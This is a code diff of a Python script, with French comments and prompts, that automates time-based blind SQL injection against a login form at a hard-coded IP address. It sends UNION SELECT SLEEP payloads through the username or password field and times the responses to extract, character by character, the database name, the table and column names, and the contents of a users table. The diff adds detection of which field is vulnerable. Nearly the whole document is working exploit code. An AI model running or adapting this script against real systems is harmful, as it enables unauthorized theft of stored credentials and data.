@@ -2,49 +2,76 @@ import requests
 import time
 
 def db_name():
-    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
+    global usr
+    usr = "idc"
+    global dictionary
+    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
+    global table 
+    table = ""
+    global url
+    url = "http://51.15.136.118/login_cookie.php"
+    global vulnerable_input
+    vulnerable_input = True
+    
     a=0
     db = []
     texte = ""
     TIME = 5
-    global url
-    url = "http://51.15.136.118/login_sqlmap.php/"
-    global table 
-    table = ""
 
     for letter in dictionary:
-        for num in range(1, 20):
-            usr = "idc"
+        for num in range(1, 10):
             nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
-            passwd_type = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
-            print(passwd_type)
+            passwd = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
+            """print(passwd)"""
             start_time = time.time()
-            response = requests.post(url, data={'username': passwd_type, 'password': usr})
+            response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
             total_time = end_time - start_time
             if total_time >= TIME:
                 table = nums
                 break
         if total_time >= TIME:
-            break
- 
- 
-    print(table)
+            break 
+    """print(table)"""
+
+    if table == "":
+        for letter in dictionary:
+            for num in range(1, 10):
+                nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
+                passwd = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
+                """print(passwd)"""
+                start_time = time.time()
+                response = requests.post(url, data={'username': passwd, 'password': usr})
+                end_time = time.time()
+                total_time = end_time - start_time
+                if total_time >= TIME:
+                    table = nums
+                    break
+            if total_time >= TIME:
+                break 
+        """print(table)"""
+        if table != "":
+            vulnerable_input = False
+            print(vulnerable_input)
+    if table == "":
+        print("Pas de base de données trouvées")
+        exit()
+
 
     for i in range(1, 20):
         for j in range(0, len(dictionary)):
-            usr = "idc"
             passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
-            print(passwd)
-
+            """print(passwd)"""
             start_time = time.time()
-            response = requests.post(url, data={'username': usr, 'password': passwd})
+            if vulnerable_input == False:   
+                response = requests.post(url, data={'username': passwd, 'password': usr})
+            else:
+                response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
             total_time = end_time - start_time
-            """print(total_time)"""
             a += 1
-            print(a)
-            if a > 27:
+            """print(a)"""
+            if a > 37:
                 break
             if total_time >= TIME:
                 texte += dictionary[j]
@@ -53,65 +80,63 @@ def db_name():
                 j = 0
                 a = 0
                 break
-    print(texte)
+    """print(texte)"""
     db.append(texte)
-    print(db)
+    """print(db)"""
 
     b=0
     for x in db:
         b += 1
-        """print("" + b + "" + db[x] + "|")"""
-        """print(str(a) + x)"""
         print("Database {} : {} ".format(b, x))
     
     c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))
 
     print("Vous avez choisi {}. ".format(db[c-1]))
+    """faire pause"""
     final_db=""
     jsp = final_db + "".join(db[c-1])
-    print(jsp)
     return jsp
 
+
 def table_name(database):
-    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
     tables_name=[]
     a=0
     texte = ""
     TIME = 5
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
-            if a > 25:
+            if a > 37:
                 if texte != "":
-                    """enlever """
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
-                    print(dictionary)
                     tables_name.append(texte)
+                    print(tables_name)
                     texte = ""
                     a=0
                     break
                 else:
                     break
-            usr = "idc"
             passwd = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
-            print(passwd)
+            """print(passwd)"""
             start_time = time.time()
-            response = requests.post(url, data={'username': usr, 'password': passwd})
+            if vulnerable_input == False:   
+                response = requests.post(url, data={'username': passwd, 'password': usr})
+            else:
+                response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
             total_time = end_time - start_time
             a += 1
-            print(texte)
-            print(tables_name)
-            print(a)
+            """print(texte)"""
+            """print(tables_name)
+            print(a)"""
             
             if total_time >= TIME:
                 texte += dictionary[j]
-                print(texte)
                 i += 1
                 j = 0
                 a = 0
                 break
-    print(tables_name)
+    """print(tables_name)"""
     b=0
     for x in tables_name:
         b += 1
@@ -122,12 +147,11 @@ def table_name(database):
     print("Vous avez choisi {}. ".format(tables_name[c-1]))
     final_db=""
     jsp2 = final_db + "".join(tables_name[c-1])
-    print(jsp2)
     return jsp2
 
 
 def column_name(database, nom_table):
-    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
+    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
     global columns_name
     columns_name=[]
     a=0
@@ -135,53 +159,48 @@ def column_name(database, nom_table):
     TIME = 5
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
-            if a > 25:
+            if a > 37:
                 if texte != "":
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
-                    print(dictionary)
                     columns_name.append(texte)
+                    print(columns_name)
                     texte = ""
                     a=0
                     break
                 else:
                     break
-            usr = "idc"
             passwd = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
-            print(passwd)
+            """print(passwd)"""
             start_time = time.time()
-            response = requests.post(url, data={'username': usr, 'password': passwd})
+            if vulnerable_input == False:   
+                response = requests.post(url, data={'username': passwd, 'password': usr})
+            else:
+                response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
             total_time = end_time - start_time
             a += 1
-            print(texte)
-            print(columns_name)
-            print(a)
+            """print(texte)"""
+            """print(columns_name)
+            print(a)"""
             
             if total_time >= TIME:
                 texte += dictionary[j]
-                print(texte)
                 i += 1
                 j = 0
                 a = 0
                 break
-    print(columns_name)
+    """print(columns_name)"""
     b=0
     for x in columns_name:
         b += 1
         print("Table {} : {} ".format(b, x))
     return columns_name
-    """c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
-    print("Vous avez choisi {}. ".format(columns_name[c-1]))
-    final_db=""
-    jsp3 = final_db + "".join(columns_name[c-1])
-    print(jsp3)
-    return jsp3"""
 
 
 def trouver_tab0(nom_table):
+    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
     tab = columns_name
-    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
     texte = ""
     TIME = 5
     table = ",1,2"
@@ -189,20 +208,21 @@ def trouver_tab0(nom_table):
     idk = []
     for i in range(1, 10):
         for j in range(0, len(dictionary)):
-            if a > 34:
+            if a > 37:
                 if texte != "":
-                    print(texte)
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
                     idk.append(texte)
+                    print(idk)
                     a=0
                     texte = ""
                     break
-            usr = "idc"
             start_time = time.time()
             passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
-            response = requests.post(url, data={'username': usr, 'password': passwd})
-            """print(passwd)"""
+            if vulnerable_input == False:   
+                response = requests.post(url, data={'username': passwd, 'password': usr})
+            else:
+                response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
             total_time = end_time - start_time
             if total_time >= TIME:
@@ -216,9 +236,9 @@ def trouver_tab0(nom_table):
 
 
 def dump_columns(table, tab0, column_name):
+    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
     tab = column_name
     nom_colonne = tab0
-    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
     texte = ""
     TIME = 5
     table = ",1,2"
@@ -232,12 +252,12 @@ def dump_columns(table, tab0, column_name):
             x = int(x)
             for i in range (1,30):
                 for j in range(0, len(dictionary)):
-                    if a > 36:
+                    if a > 37:
                         if texte != "":
+                            print(texte)
                             idk.append(texte)
                             a=0
                             texte = ""
-                            print(idk)
                             if x < len(nom_colonne):
                                 x += 1
                             elif z < len(tab)-1:
@@ -256,11 +276,13 @@ def dump_columns(table, tab0, column_name):
                         else:
                             break
 
-                    usr = "idc"
                     start_time = time.time()
                     passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
-                    response = requests.post(url, data={'username': usr, 'password': passwd})
                     print(passwd)
+                    if vulnerable_input == False:   
+                        response = requests.post(url, data={'username': passwd, 'password': usr})
+                    else:
+                        response = requests.post(url, data={'username': usr, 'password': passwd})
                     end_time = time.time()
                     total_time = end_time - start_time
                     a+=1
